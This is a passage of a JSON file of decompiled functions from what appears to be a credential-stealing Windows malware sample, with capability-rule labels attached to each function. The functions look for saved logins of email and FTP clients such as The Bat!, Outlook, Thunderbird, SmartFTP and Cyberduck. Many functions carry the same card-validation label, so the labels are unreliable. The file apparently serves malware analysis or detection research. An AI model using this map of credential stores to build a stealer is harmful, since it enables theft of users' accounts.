    },
    "0040eef7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eef7(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    uint var_4h;\n    \n    fcn.00404351(arg_8h, arg_ch, \"account.cfg\", 0xbeef0000);\n    fcn.00404351(arg_8h, arg_ch, \"account.cfn\", 0xbeef0001);\n    arg_ch_00 = fcn.00401fb9(arg_ch);\n    if (arg_ch_00 != 0) {\n        fcn.00404351(arg_8h, arg_ch_00, \"account.cfg\", 0xbeef0000);\n        fcn.00404351(arg_8h, arg_ch_00, \"account.cfn\", 0xbeef0001);\n        fcn.004018b8(arg_ch_00);\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "0040f093": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f093(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x5d, 0);\n    fcn.0040439c(arg_8h, \"\\\\BatMail\", \"account.cfg\", 0xbeef0000);\n    fcn.0040439c(arg_8h, \"\\\\BatMail\", \"account.cfn\", 0xbeef0001);\n    fcn.0040439c(arg_8h, \"\\\\The Bat!\", \"account.cfg\", 0xbeef0000);\n    fcn.0040439c(arg_8h, \"\\\\The Bat!\", \"account.cfn\", 0xbeef0001);\n    fcn.0040ef6c(arg_8h, *0x414869);\n    fcn.0040ef6c(arg_8h, 0x80000002);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 230
    },
    "0040f12e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040f12e(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_ch_00;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.00402abb(arg_10h, arg_14h);\n    if (arg_ch_00 != 0) {\n        fcn.00401569(arg_8h, arg_18h);\n        fcn.004015cb(arg_8h, arg_ch);\n        fcn.004015cb(arg_8h, arg_ch_00);\n        fcn.004018b8(arg_ch_00);\n        arg_ch_00 = 1;\n    }\n    return arg_ch_00;\n}\n",
        "token_count": 175
    },
    "0040f30d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f30d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_ch, arg_10h, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401df8(arg_10h, 0x414845);\n            uVar2 = fcn.00401e4c(uVar2, &var_80ch);\n            fcn.0040f178(arg_8h, arg_ch, uVar2);\n            fcn.004018b8(uVar2);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 304
    },
    "0040f3ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f3ac(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_ch, arg_10h, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401df8(arg_10h, 0x414845);\n            uVar2 = fcn.00401e4c(uVar2, &var_80ch);\n            uVar2 = fcn.00401e4c(uVar2, arg_14h);\n            fcn.0040f30d(arg_8h, arg_ch, uVar2);\n            fcn.004018b8(uVar2);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 333
    },
    "0040f740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f740(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint uVar1;\n    int32_t arg_8h_00;\n    uint uVar2;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x5e, 0);\n    fcn.0040f6ee(arg_8h);\n    fcn.0040f30d(arg_8h, *0x414869, \"Software\\\\Microsoft\\\\Internet Account Manager\\\\Accounts\");\n    uVar1 = fcn.00401df8(0x414845, \"Software\\\\Microsoft\\\\Internet Account Manager\\\\Accounts\");\n    uVar2 = arg_8h;\n    fcn.0040f3ac(arg_8h, *0x414869, \"Identities\", uVar1);\n    fcn.004018b8(uVar2);\n    arg_8h_00 = fcn.00401d71(0x80000002, \"Software\\\\Microsoft\\\\Internet Account Manager\", \"Outlook\", 0);\n    if (arg_8h_00 != 0) {\n        uVar1 = fcn.00401e4c(arg_8h_00, \"\\\\Accounts\");\n        uVar2 = arg_8h;\n        fcn.0040f30d(arg_8h, *0x414869, uVar1);\n        fcn.004018b8(uVar2);\n    }\n    fcn.0040f30d(arg_8h, *0x414869, \"Software\\\\Microsoft\\\\Office\\\\Outlook\\\\OMI Account Manager\\\\Accounts\");\n    fcn.0040f3ac(arg_8h, *0x414869, \n                 \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows Messaging Subsystem\\\\Profiles\\\\Microsoft Outlook Internet Settings\"\n                 , 0);\n    fcn.0040f3ac(arg_8h, *0x414869, \n                 \"Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows Messaging Subsystem\\\\Profiles\\\\Outlook\", 0);\n    fcn.00401636(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 478
    },
    "0040f81f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f81f(uint arg_8h)\n\n{\n    uint var_109h;\n    uint var_4h;\n    \n    var_4h = fcn.004015f0(arg_8h, 0x5f, 0);\n    *0x416030 = 2;\n    fcn.0041075a(0x104, &var_109h);\n    fcn.00409c3c(arg_8h, *0x414869, \"Software\\\\Mozilla\", 0x4171e6, \"\\\\Thunderbird\");\n    fcn.00409c3c(arg_8h, 0x80000002, \"Software\\\\Mozilla\", 0x4171e6, \"\\\\Thunderbird\");\n    fcn.00410748(&var_109h);\n    *0x416030 = 3;\n    fcn.0041075a(0x104, &var_109h);\n    fcn.00409c3c(arg_8h, *0x414869, \"Software\\\\Mozilla\", 0x4171e6, \"\\\\Thunderbird\");\n    fcn.00409c3c(arg_8h, 0x80000002, \"Software\\\\Mozilla\", 0x4171e6, \"\\\\Thunderbird\");\n    fcn.00410748(&var_109h);\n    fcn.00401636(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 316
    },
    "0040fb14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040fb28)\n// WARNING: Removing unreachable block (ram,0x0040fb2b)\n\nvoid fcn.0040fb14(void)\n\n{\n    return;\n}\n",
        "token_count": 49
    },
    "0040fbed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0040fc00)\n\nvoid fcn.0040fbed(void)\n\n{\n    return;\n}\n",
        "token_count": 42
    },
    "0040fd60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040fd75)\n\nvoid fcn.0040fd60(void)\n\n{\n    return;\n}\n",
        "token_count": 32
    },
    "0040fe6f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x0040fe87)\n\nvoid fcn.0040fe6f(void)\n\n{\n    return;\n}\n",
        "token_count": 43
    },
    "00410065": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00410078)\n// WARNING: Removing unreachable block (ram,0x0041011f)\n// WARNING: Removing unreachable block (ram,0x0041012f)\n// WARNING: Removing unreachable block (ram,0x00410154)\n// WARNING: Removing unreachable block (ram,0x0041016f)\n// WARNING: Removing unreachable block (ram,0x00410179)\n// WARNING: Removing unreachable block (ram,0x00410196)\n// WARNING: Removing unreachable block (ram,0x004101be)\n// WARNING: Removing unreachable block (ram,0x004101df)\n// WARNING: Removing unreachable block (ram,0x004101ee)\n// WARNING: Removing unreachable block (ram,0x004101bc)\n// WARNING: Removing unreachable block (ram,0x00410201)\n\nvoid fcn.00410065(void)\n\n{\n    uint var_14h;\n    uint oflag;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 230
    },
    "00410508": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041051b)\n\nvoid fcn.00410508(void)\n\n{\n    return;\n}\n",
        "token_count": 31
    },
    "004109de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004109de(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = param_1 + 0x41c;\n    *piVar1 = *piVar1 + -1;\n    if (*piVar1 == 0) {\n        *(param_1 + 0x418) = *(param_1 + 0x410);\n        *(param_1 + 0x41c) = 8;\n        *(param_1 + 0x410) = *(param_1 + 0x410) + 1;\n    }\n    **(param_1 + 0x418) = **(param_1 + 0x418) * '\\x02' + '\\x01';\n    return;\n}\n",
        "token_count": 172
    },
    "00410b19": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00410b19(char *param_1, uint32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pcVar5;\n    \n    if (0xf < param_2) {\n        param_2 = 0xf;\n    }\n    pcVar5 = param_1 + -param_2;\n    iVar1 = 0;\n    do {\n        uVar3 = param_2;\n        pcVar4 = pcVar5;\n        if (*param_1 == '\\0') {\n            iVar2 = iVar1 + 7;\n        }\n        else {\n            do {\n                if (*param_1 == *pcVar4) break;\n                uVar3 = uVar3 - 1;\n                pcVar4 = pcVar4 + 1;\n            } while (uVar3 != 0);\n            iVar2 = iVar1 + 7;\n            if (uVar3 == 0) {\n                iVar2 = iVar1 + 9;\n            }\n        }\n        param_1 = param_1 + 1;\n        pcVar5 = pcVar5 + 1;\n        param_3 = param_3 + -1;\n        iVar1 = iVar2;\n        if (param_3 == 0) {\n            return iVar2;\n        }\n    } while( true );\n}\n",
        "token_count": 314
    },
    "00411ea6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411ea6(uint param_1, uint param_2, int32_t param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    if (param_3 == 0) {\n        return;\n    }\n    fcn.0041143d(param_1, param_2, param_3, param_4, param_5, param_6);\n    return;\n}\n",
        "token_count": 94
    },
    "004120c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004120c0(uint *param_1)\n\n{\n    uint *puVar1;\n    \n    puVar1 = 0x417470;\n    do {\n        *param_1 = *puVar1;\n        puVar1 = puVar1 + 1;\n        param_1 = param_1 + 1;\n    } while (puVar1 < 0x4174f0);\n    return;\n}\n",
        "token_count": 93
    },
    "004120de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004120de(uint *param_1)\n\n{\n    uint *puVar1;\n    \n    puVar1 = 0x417470;\n    do {\n        *puVar1 = *param_1;\n        param_1 = param_1 + 1;\n        puVar1 = puVar1 + 1;\n    } while (puVar1 < 0x4174f0);\n    return;\n}\n",
        "token_count": 92
    },
    "0041251f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041251f(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00412131(arg_8h, &var_8h);\n    fcn.00412131(arg_8h + 8, &var_10h);\n    fcn.004121e9(&var_8h, 0x417470);\n    fcn.004121e9(&var_10h, 0x417470);\n    uVar1 = var_4h;\n    var_4h = var_10h;\n    var_10h = uVar1;\n    fcn.004121e9(&var_8h, 0x4174f0);\n    fcn.004121e9(&var_10h, 0x4174f0);\n    uVar1 = var_4h;\n    var_4h = var_10h;\n    var_10h = uVar1;\n    fcn.004121e9(&var_8h, 0x417570);\n    fcn.004121e9(&var_10h, 0x417570);\n    fcn.0041219a(&var_8h, arg_ch);\n    fcn.0041219a(&var_10h, arg_ch + 8);\n    return;\n}\n",
        "token_count": 320
    },
    "0041274b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0041274b(int32_t param_1, uint16_t param_2)\n\n{\n    int32_t arg_8h;\n    int32_t arg_8h_00;\n    \n    if (param_2 != 0) {\n        arg_8h = param_1 + 0x10;\n        arg_8h_00 = param_1;\n    }\n    else {\n        arg_8h = param_1;\n        arg_8h_00 = param_1 + 0x10;\n    }\n    fcn.00411f00(param_1 + 8, param_2 == 0);\n    fcn.004120c0(0x4174f0);\n    fcn.00411f00(arg_8h_00, param_2);\n    fcn.004120c0(0x417570);\n    fcn.00411f00(arg_8h, param_2);\n    return;\n}\n",
        "token_count": 209
    },
    "004127aa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004127aa(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    \n    fcn.004120c0(param_1);\n    puVar2 = param_1 + 0x80;\n    puVar1 = 0x4174f0;\n    do {\n        *puVar2 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar2 = puVar2 + 1;\n    } while (puVar1 < 0x417570);\n    puVar1 = 0x417570;\n    do {\n        *puVar2 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar2 = puVar2 + 1;\n    } while (puVar1 < 0x4175f0);\n    return;\n}\n",
        "token_count": 191
    },
    "004127eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004127eb(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    \n    fcn.004120de(param_1);\n    puVar2 = param_1 + 0x80;\n    puVar1 = 0x4174f0;\n    do {\n        *puVar1 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar1 = puVar1 + 1;\n    } while (puVar1 < 0x417570);\n    puVar1 = 0x417570;\n    do {\n        *puVar1 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar1 = puVar1 + 1;\n    } while (puVar1 < 0x4175f0);\n    return;\n}\n",
        "token_count": 190
    },
    "0041282c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041282c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00412131(arg_8h, &var_8h);\n    fcn.00412131(arg_8h + 8, &var_10h);\n    fcn.00412131(arg_8h + 0x10, &var_18h);\n    fcn.004121e9(&var_8h, 0x417470);\n    fcn.004121e9(&var_10h, 0x417470);\n    fcn.004121e9(&var_18h, 0x417470);\n    uVar2 = var_4h;\n    uVar1 = var_ch;\n    var_4h = var_10h;\n    var_10h = uVar2;\n    var_ch = var_18h;\n    var_18h = uVar1;\n    fcn.004121e9(&var_8h, 0x4174f0);\n    fcn.004121e9(&var_10h, 0x4174f0);\n    fcn.004121e9(&var_18h, 0x4174f0);\n    uVar2 = var_4h;\n    uVar1 = var_ch;\n    var_4h = var_10h;\n    var_10h = uVar2;\n    var_ch = var_18h;\n    var_18h = uVar1;\n    fcn.004121e9(&var_8h, 0x417570);\n    fcn.004121e9(&var_10h, 0x417570);\n    fcn.004121e9(&var_18h, 0x417570);\n    fcn.0041219a(&var_8h, arg_ch);\n    fcn.0041219a(&var_10h, arg_ch + 8);\n    fcn.0041219a(&var_18h, arg_ch + 0x10);\n    return;\n}\n",
        "token_count": 499
    },
    "004129f6": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004129f6(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    iVar1 = 0;\n    do {\n        *(&var_8h + iVar1) = *(iVar1 + arg_8h);\n        *(iVar1 + arg_ch) = *(iVar1 + arg_8h);\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 8);\n    fcn.004124ce(arg_8h, arg_ch);\n    iVar1 = 0;\n    do {\n        *(iVar1 + arg_ch) = *(iVar1 + arg_10h) ^ *(iVar1 + arg_ch);\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 8);\n    iVar1 = 0;\n    do {\n        *(iVar1 + arg_10h) = *(&var_8h + iVar1);\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 8);\n    return;\n}\n",
        "token_count": 244
    },
    "00401ffd": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401ffd(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    \n    fcn.004018e6(arg_ch, 0x10);\n    iVar1 = fcn.00410652(arg_8h, 0x80000000, 3, 0, 3, 0, 0);\n    *arg_ch = iVar1;\n    if (iVar1 + 1 != 0) {\n        iVar1 = fcn.004106a6(iVar1 + 1, 0);\n        arg_ch[3] = iVar1;\n        iVar1 = fcn.004106ac(*arg_ch, 0, 2, 0, 0, 0);\n        if (iVar1 == 0) {\n            fcn.0041065e(*arg_ch);\n            *arg_ch = -1;\n        }\n        else {\n            arg_ch[1] = iVar1;\n            iVar1 = fcn.004106b2(iVar1, 4, 0, 0, 0);\n            arg_ch[2] = iVar1;\n            if (iVar1 == 0) {\n                fcn.0041065e(arg_ch[1]);\n                fcn.0041065e(*arg_ch);\n                *arg_ch = -1;\n            }\n        }\n    }\n    return arg_ch[2] != 0;\n}\n",
        "token_count": 309
    },
    "0041248a": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0041248a(int32_t param_1, uint16_t param_2)\n\n{\n    fcn.00411f00(param_1 + 8, param_2 == 0);\n    fcn.004120c0(0x4174f0);\n    fcn.00411f00(param_1, param_2);\n    fcn.004120c0(0x417570);\n    return;\n}\n",
        "token_count": 96
    },
    "0040240a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040240a(void)\n\n{\n    uint *puVar1;\n    uint *arg_8h;\n    \n    arg_8h = *0x41484b;\n    while (arg_8h != NULL) {\n        puVar1 = *arg_8h;\n        fcn.004018b8(arg_8h);\n        arg_8h = puVar1;\n    }\n    *0x41484b = NULL;\n    return;\n}\n",
        "token_count": 102
    },
    "0040ba3c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040ba3c(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    \n    fcn.004028fe(arg_8h);\n    puVar2 = fcn.00410808(arg_8h, 0x4164c1);\n    if (puVar2 == NULL) {\n        return puVar2;\n    }\n    *puVar2 = 0;\n    fcn.004028fe(arg_8h);\n    pcVar4 = 0x4164c3;\n    do {\n        puVar2 = fcn.00410712();\n        if (puVar2 == NULL) {\n            return puVar2;\n        }\n        iVar3 = -1;\n        pcVar5 = pcVar4;\n        do {\n            pcVar4 = pcVar5;\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            pcVar4 = pcVar5 + 1;\n            cVar1 = *pcVar5;\n            pcVar5 = pcVar4;\n        } while (cVar1 != '\\0');\n        if (*pcVar4 == '\\0') {\n            puVar2 = fcn.0041066a(arg_8h);\n            if (puVar2 == NULL) {\n                return puVar2;\n            }\n            iVar3 = fcn.00410712(arg_8h, 0x4164f3);\n            if (iVar3 == 0) {\n                *0x418e9c = arg_ch;\n            }\n            iVar3 = fcn.00410712(arg_8h, 0x4164fe);\n            if (iVar3 == 0) {\n                *0x418ea0 = arg_ch;\n            }\n            iVar3 = fcn.00410712(arg_8h, 0x41650d);\n            if (iVar3 == 0) {\n                *0x418ea4 = arg_ch;\n            }\n            return 0x1;\n        }\n    } while( true );\n}\n",
        "token_count": 470
    },
    "00405c6c": {
        "rules": [
            "gather bulletproof-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c6c(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00404351(arg_8h, arg_ch, \".dat\", 0xbeef0000);\n    fcn.00404351(arg_8h, arg_ch, \".bps\", 0xbeef0001);\n    return;\n}\n",
        "token_count": 77
    },
    "00405de8": {
        "rules": [
            "gather smart-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405de8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint arg_ch_00;\n    \n    arg_8h_00 = fcn.00401eb1(arg_ch);\n    if (arg_8h_00 != 0) {\n        uVar1 = fcn.00401e4c(arg_8h_00, \"\\\\SmartFTP\");\n        arg_ch_00 = arg_8h;\n        fcn.00404351(arg_8h, uVar1, 0x415671, 0xbeef0000);\n        uVar1 = arg_8h;\n        fcn.00404351(arg_8h, arg_ch_00, 0x415680, 0xbeef0001);\n        fcn.00404351(arg_8h, uVar1, \"History.dat\", 0xbeef0002);\n        fcn.004018b8(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 229
    },
    "00405e8b": {
        "rules": [
            "gather turbo-ftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405e8b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\TurboFTP\", \"installpath\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00404351(arg_8h, iVar1, arg_ch, arg_10h);\n        fcn.004018b8(uVar2);\n    }\n    iVar1 = fcn.00401d71(0x80000002, \"Software\\\\TurboFTP\", \"installpath\", 0);\n    if (iVar1 != 0) {\n        uVar2 = arg_8h;\n        fcn.00404351(arg_8h, iVar1, arg_ch, arg_10h);\n        fcn.004018b8(uVar2);\n    }\n    fcn.0040439c(arg_8h, \"\\\\TurboFTP\", arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 250
    },
    "004076f3": {
        "rules": [
            "gather directory-opus information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004076f3(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    uint arg_ch_00;\n    \n    arg_8h_00 = fcn.00401eb1(arg_ch);\n    if (arg_8h_00 != 0) {\n        uVar1 = fcn.00401e4c(arg_8h_00, \"\\\\GPSoftware\\\\Directory Opus\");\n        arg_ch_00 = arg_8h;\n        fcn.00404351(arg_8h, uVar1, \".oxc\", 0xbeef0000);\n        uVar1 = arg_8h;\n        fcn.00404351(arg_8h, arg_ch_00, \".oll\", 0xbeef0001);\n        fcn.00404351(arg_8h, uVar1, \"ftplast.osd\", 0xbeef0002);\n        fcn.004018b8(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 231
    },
    "00407a33": {
        "rules": [
            "gather leapftp information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407a33(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    \n    arg_8h_00 = fcn.00401eb1(arg_ch);\n    if (arg_8h_00 != 0) {\n        arg_ch_00 = fcn.00401e4c(arg_8h_00, \"\\\\LeapWare\\\\LeapFTP\");\n        arg_ch_01 = arg_8h;\n        fcn.00404351(arg_8h, arg_ch_00, \"sites.dat\", 0xbeef0000);\n        fcn.00404351(arg_8h, arg_ch_01, 0x415bbe, 0xbeef0001);\n        fcn.004018b8(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00408fd3": {
        "rules": [
            "gather ftp-voyager information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408fd3(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    \n    arg_8h_00 = fcn.00401eb1(arg_ch);\n    if (arg_8h_00 != 0) {\n        arg_ch_00 = fcn.00401e4c(arg_8h_00, \"\\\\RhinoSoft.com\");\n        arg_ch_01 = arg_8h;\n        fcn.00404351(arg_8h, arg_ch_00, \"FTPVoyager.ftp\", 0xbeef0000);\n        fcn.00404351(arg_8h, arg_ch_01, \"FTPVoyager.qc\", 0xbeef0001);\n        fcn.004018b8(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 201
    },
    "0040c732": {
        "rules": [
            "gather global-downloader information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c732(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint arg_ch_00;\n    \n    arg_8h_00 = fcn.00401eb1(arg_ch);\n    if (arg_8h_00 != 0) {\n        arg_ch_00 = fcn.00401e4c(arg_8h_00, \"\\\\Global Downloader\");\n        fcn.00404351(arg_8h, arg_ch_00, \"SM.arch\", 0xbeef0000);\n        fcn.004018b8(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "0040d965": {
        "rules": [
            "gather cyberduck information"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d965(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint arg_ch_00;\n    \n    arg_8h_00 = fcn.00401eb1(arg_ch);\n    if (arg_8h_00 != 0) {\n        arg_ch_00 = fcn.00401e4c(arg_8h_00, \"\\\\Cyberduck\");\n        fcn.004041a6(arg_8h, arg_ch_00, \"user.config\", 0xbeef0000, fcn.0040d854);\n        fcn.004018b8(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 155
    }
}